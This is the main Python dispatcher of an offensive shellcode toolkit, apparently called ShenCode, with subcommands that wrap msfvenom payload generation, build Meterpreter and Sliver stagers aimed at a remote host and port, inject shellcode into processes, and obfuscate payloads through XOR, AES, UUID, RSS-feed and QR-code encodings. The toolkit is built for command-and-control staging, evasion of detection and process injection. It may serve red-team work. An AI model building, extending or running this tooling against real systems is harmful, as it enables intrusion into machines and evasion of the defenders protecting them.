import os

from utils.args import parse_arguments
from utils.helper import nstate as nstate
from utils.helper import FileCheck
import utils.hashes as hashes
import utils.header

## Migrate Mods
import modules.aes as aes
import modules.bytebert as bytebert
import modules.byteswap as byteswap
import modules.extract as extract
import modules.feed as feed
import modules.formatout as formatout
import utils.helper
if os.name == 'nt':
  import modules.injection as injection
  import modules.meterpreter as meterpreter
import modules.msfvenom as msf
import modules.output as output
import modules.qrcode as qrcode
if os.name == 'nt':
  import modules.rolhash as rolhash
  import modules.sliver as sliver
import modules.uuid as uuid
import modules.xor as xor
import modules.xorpoly as xorpoly

#import modules.power as power

Version = '0.7.2'
banner = 0

print(f"{nstate.HEADER}")
print(f'{utils.header.get_header(banner)}')
print(f'Version {Version} by psycore8 -{nstate.ENDC} {nstate.TextLink('https://www.nosociety.de')}\n')
arguments = parse_arguments()

# make sure your metasploit binary folder is in your PATH variable
if os.name == 'nt':
  msfvenom_path = "msfvenom.bat"
  tpl_path = 'tpl\\'
elif os.name == 'posix':
  msfvenom_path = 'msfvenom'
  tpl_path = 'tpl/'
  
def main(command_line=None):
  if arguments.command == 'msfvenom':
    #print(f"{nstate.OKBLUE} create payload")
    cs = msf.msfvenom(arguments.cmd, msfvenom_path)
    cs.process()
    #cs.CreateShellcodeEx(msfvenom_path)

  # elif arguments.command == 'power':
  #   p = power.example(arguments.base, arguments.exponent, 0, arguments.verbose)
  #   p.process()

  elif arguments.command == 'output':
    mod = output.format_shellcode(arguments.input, arguments.syntax, arguments.bytes_per_row, arguments.decimal, arguments.lines, arguments.no_line_break, arguments.output)
    #print(f'Input file: {mod.input_file}')
    #filecheck, outstrings = FileCheck.CheckSourceFile(mod.input_file, 'MOD-OUT')
    #for string in outstrings:
      #print(f'{string}')
    #if filecheck:
      #print(f"{nstate.OKBLUE} processing shellcode format... NoLineBreak: {mod.no_line_break}\n")
    #print(F'{mod.process()}')
    mod.process()
    #else:
      #exit()
    #if mod.cFile:
      #print(f'Output file: {mod.output_file}')
      #filecheck, outstrings = FileCheck.CheckWrittenFile(mod.output_file, 'XOR-POLY')
      #for string in outstrings:
        #print(f'{string}')
    #nstate.m('done')
    #print(f"{nstate.OKGREEN} DONE!")

  elif arguments.command == 'meterpreter':
    stager = meterpreter.stage(arguments.remote_host, arguments.port, arguments.timeout, arguments.arch, arguments.sleep)
    stager.process()

  elif arguments.command == 'sliver':
    stager = sliver.stage(arguments.remote_host, arguments.port, arguments.sleep)
    stager.process()

  elif arguments.command == 'bytebert':
    bb = bytebert.bb_encoder(arguments.input, arguments.output, arguments.variable_padding)
    bb.process()

  elif arguments.command == 'xorpoly':
    poly = xorpoly.xor(arguments.input, arguments.output, b'', b'', f'{tpl_path}xor-stub.tpl', arguments.key)
    xor_enc = xor.xor_encoder('', '', 0)
    filecheck, outstrings = FileCheck.CheckSourceFile(poly.input_file, 'XOR-POLY')
    for string in outstrings:
      print(f'{string}')
    if filecheck:
      with open(poly.input_file, "rb") as file:
        shellcode = file.read()
    else:
      exit()
    poly.xored_shellcode = xor_enc.xor_crypt_bytes(shellcode, int(poly.xor_key))
    poly.process()
    filecheck, outstrings = FileCheck.CheckWrittenFile(poly.output_file, 'XOR-POLY')
    for string in outstrings:
      print(f'{string}')

  elif arguments.command == 'byteswap':
    swapper = byteswap.xor(arguments.input, arguments.output, f'{tpl_path}byteswap-short.tpl', arguments.key)
    filecheck, outstrings = FileCheck.CheckSourceFile(swapper.input_file, 'XOR-SWAP')
    for string in outstrings:
      print(f'{string}')
    if filecheck:
      with open(swapper.input_file, "rb") as file:
        shellcode = file.read()
    else:
      exit()
    swapper.process()
    filecheck, outstrings = FileCheck.CheckWrittenFile(swapper.output_file, 'XOR-SWAP')
    for string in outstrings:
      print(f'{string}')

  elif arguments.command == 'aes':
    aes_enc = aes.aes_encoder(arguments.mode, arguments.input, arguments.output, arguments.key, b'')
    aes_enc.process()
    #print(f'{nstate.OKBLUE} [AES] Module')
    #aes_enc.key = aes_enc.key.encode('utf-8')
    #if aes_enc.mode == 'encode':
      # print(f'{nstate.OKBLUE} [AES] ENCRYPT')
      # filecheck, outstrings = FileCheck.CheckSourceFile(aes_enc.input_file, 'AES-ENC')
      # for string in outstrings:
      #   print(f'{string}')
      # if filecheck:
      #aes_enc.encode()
      #   filecheck, outstrings = FileCheck.CheckWrittenFile(aes_enc.output_file, 'AES-ENC')
      #   for string in outstrings:
      #     print(f'{string}')
      # else:
      #   exit()
    #elif aes_enc.mode == 'decode':
      # print(f'{nstate.OKBLUE} [AES] DECRYPT')
      # filecheck, outstrings = FileCheck.CheckSourceFile(aes_enc.input_file, 'AES-DEC')
      # for string in outstrings:
      #   print(f'{string}')
      # if filecheck:
      #aes_enc.decode()
      #   filecheck, outstrings = FileCheck.CheckWrittenFile(aes_enc.output_file, 'AES-DEC')
      #   for string in outstrings:
      #     print(f'{string}')
      # else:
      #   exit()

  elif arguments.command == 'uuid':
      #short_fn = os.path.basename(arguments.input)
      uuid_obf = uuid.uuid_obfuscator(arguments.input, '', '', 0)
      uuid_obf.process()
      #print(f"{nstate.OKBLUE} try to open file")
      #if uuid_obf.open_file(uuid_obf.input_file):
      #  print(f"{nstate.OKGREEN} reading {short_fn} successful!")
      #else:
      #  print(f"{nstate.FAIL} file not found, exit")
      #print(f"{nstate.OKBLUE} try to generate UUIDs")  
      #print(uuid_obf.CreateVar())

  elif arguments.command == 'feed':
    feed_obf = feed.feed_obfuscator(arguments.input, arguments.output, arguments.uri, arguments.reassemble)
    feed_obf.process()
    # if feed_obf.uri:
    #   feed_obf.reassemble_shellcode()
    #   filecheck, outstrings = FileCheck.CheckSourceFile(feed_obf.output_file, 'OBF-RSS')
    #   for string in outstrings:
    #     print(string)
    #   exit()
    # filecheck, outstrings = FileCheck.CheckSourceFile(feed_obf.input_file, 'OBF-RSS')
    # for string in outstrings:
    #   print(string)
    # if filecheck:
    #   feed_obf.open_file()
    #   feed_obf.convert_bytes_to_fake_id()
    #   feed_obf.generate_feed()
    # else:
    #   exit()
    # filecheck, outstrings = FileCheck.CheckSourceFile(feed_obf.output_file, 'OBF-RSS')
    # for string in outstrings:
    #   print(string)

  elif arguments.command == 'qrcode':
    qr = qrcode.qrcode_obfuscator(arguments.input, arguments.output, '')
    qr.process()
    # filecheck, outstrings = FileCheck.CheckSourceFile(qr.input_file, 'OBF-QRC')
    # for string in outstrings:
    #   print(f'{string}')
    # if filecheck:
    #   qr.open_file()

    # else:
    #   exit()
    # filecheck, outstrings = FileCheck.CheckWrittenFile(qr.output_file, 'OBF-QRC')
    # for string in outstrings:
    #   print(f'{string}')

  elif arguments.command == 'formatout':
      fout = formatout.format(arguments.input, arguments.syntax, arguments.lines, arguments.no_break, arguments.write, arguments.bytes_per_row)
      print(fout.input_file)
      print(f"{nstate.OKBLUE} processing shellcode format... NoLineBreak: {fout.no_break}")
      scFormat = fout.process()
      print(scFormat)
      if arguments.write:
        fout.WriteToTemplate(fout.write_out, scFormat)
        print(f"{nstate.OKGREEN} Output written in buf {fout.write_out}")
      print(f"{nstate.OKGREEN} DONE!")

  elif arguments.command == 'rolhash':
      r2l = rolhash.ror2rol_obfuscator(arguments.input, arguments.output, arguments.key)
      filecheck, outstrings = FileCheck.CheckSourceFile(r2l.input_file, 'ROR2ROL')
      for string in outstrings:
        print(f'{string}')
      if filecheck:
        ror_key = int(r2l.key)
        if (ror_key < 32) or (ror_key > 255):
          print(f"{nstate.FAIL} Key must be between 33 and 255")
          exit()
        r2l.process()
      else:
        exit()
      filecheck, outstrings = FileCheck.CheckWrittenFile(r2l.output_file, 'ROR2ROL')
      for string in outstrings:
        print(f'{string}')

  elif arguments.command == 'xor':
      xor_encoder = xor.xor_encoder(arguments.input, arguments.output, arguments.key, arguments.verbose)
      xor_encoder.process()
      # print(f"{nstate.OKBLUE} Reading shellcode")
      # filecheck, outstrings = FileCheck.CheckSourceFile(xor_encoder.input_file, 'XOR-ENC')
      # for strings in outstrings:
      #   print(f'{strings}')
      # if filecheck:
      #   with open(arguments.input, "rb") as file:
      #     shellcode = file.read()
      # else:
      #   exit()
      # modified_shellcode = xor_encoder.xor_crypt_bytes(shellcode, int(xor_encoder.xor_key))
      # with open(xor_encoder.output_file, 'wb') as file:
      #   file.write(modified_shellcode)
      # filecheck, outstrings = FileCheck.CheckWrittenFile(xor_encoder.output_file, 'XOR-ENC')
      # for strings in outstrings:
      #   print(f'{strings}')
      # if not filecheck:
      #   exit()

  elif arguments.command == 'injection':
    code_injection = injection.inject(arguments.input, arguments.start, arguments.process, '', arguments.resume_thread, arguments.virtual_protect)
    code_injection.process()
    # print(f"{nstate.OKBLUE} Reading shellcode")
    # filecheck, outstrings = FileCheck.CheckSourceFile(code_injection.input_file, 'iNJECT')
    # for strings in outstrings:
    #   print(f'{strings}')
    # if filecheck:
    #   with open(code_injection.input_file, "rb") as file:
    #     code_injection.shellcode = file.read()
    #     code_injection.start_injection()

  elif arguments.command == 'extract':
    ext = extract.extract_shellcode(arguments.input, arguments.output, arguments.start_offset, arguments.end_offset)
    ext.process()
    # filecheck, outstrings = FileCheck.CheckSourceFile(ext.input_file, 'XTRACT')
    # for string in outstrings:
    #   print(f'{string}')
    # if filecheck:
    #   ext.process()
    # else:
    #   exit()
    # filecheck, outstrings = FileCheck.CheckSourceFile(ext.output_file, 'XTRACT')
    # for string in outstrings:
    #   print(f'{string}')

  elif arguments.version:
    print(f'ShenCode {Version}')

if __name__ == "__main__":
    main()
